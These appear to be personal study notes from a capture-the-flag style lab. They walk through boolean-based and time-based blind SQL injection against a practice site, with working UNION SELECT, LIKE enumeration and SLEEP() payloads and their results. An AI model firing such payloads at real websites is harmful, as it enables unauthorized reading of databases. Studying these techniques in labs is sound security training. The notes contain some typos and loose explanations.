Boolean Based
Boolean Based Injection is the type of injection where we get to results after a injection attempt. 
Results can be true/false, yes/or, on/off , 1/0, or any result with two outcomes.

URL provided
https://website.thm/checkuser?username=admin

The query for the above ulr looks like this  "select * from users where username = 'admin' LIMIT 1"

Since username 'admin' is true we'll use a false name like admin123 to force the database to confirm to true things, by changing the state taken from false to true.

The first payload
https://website.thm/checkuser?username=admin123' union select 1;--
result: {"taken":false}

Second payload
https://website.thm/checkuser?username=admin123' union select 1,2,3;--
Result: {"taken":true}

paylaod (trying to find the name of the database)
https://website.thm/checkuser?username=admin123' union select 1,2,3 where database() like '%';--
Result: {"taken":true}

https://website.thm/checkuser?username=admin123' union select 1,2,3 where database() like 's%';--
Result: {"taken":true}

Now you move on to the next character of the database name until you find another true response, for example, 'sa%', 'sb%', 'sc%', etc. 
Keep on with this process until you discover all the characters of the database name, which is sqli_three.

admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
Result: false
https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--
Result: true
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';
Result: false
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';
Result: false
admin123' UNION SELECT 1,2,3 from users where username like 'a%
Result: true

Time-Based SQLi
Time-Based is similar to Boolean-Based because they behave the same when the request is sent, though Time-Based does'nt undicate whether the query is wrong or right
Time delay is introduced when crafting payloads by using SLEEP() alonside with UNION statement.
SlEEP() method can only be executed upon a successful UNION SELECT statement.

Our first paylaod
https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(5);--

Repeating the same method of finding information in boolean-based 
referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--













